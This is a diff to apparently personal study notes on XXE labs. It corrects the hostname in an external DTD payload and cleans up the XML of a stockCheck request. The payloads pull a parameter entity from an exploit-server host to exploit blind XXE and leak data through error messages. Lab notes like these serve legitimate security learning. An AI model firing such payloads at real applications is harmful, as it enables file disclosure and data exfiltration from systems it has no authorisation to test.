@@ -47,7 +47,7 @@ Check if stock check features is XML. Check if value inside XML can be modified 
   
   submit the following XXE payload to the vulnerable application:
 ```
-<!DOCTYPE food [<!ENTITY % xxx SYSTEM "https://exploit_id.exploit-server.net/exploit.dtd"> %xxx;]>
+<!DOCTYPE food [<!ENTITY % xxx SYSTEM "https://exploit-exploit_id.exploit-server.net/exploit.dtd"> %xxx;]>
 ```
 - ==Exploiting blind XXE to retrieve data via error messages== 
 ``` 
@@ -62,7 +62,7 @@ Check if stock check features is XML. Check if value inside XML can be modified 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE food [<!ENTITY % xxx SYSTEM "https://exploit_id.exploit-server.net/exploit"> %xxx; ]>
-<stockCheck>\<productId>1\</productId>\<storeId>1\</storeId>\</stockCheck>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
 - ==Exploiting XInclude to retrieve files== 
   Test if it parses  XML:
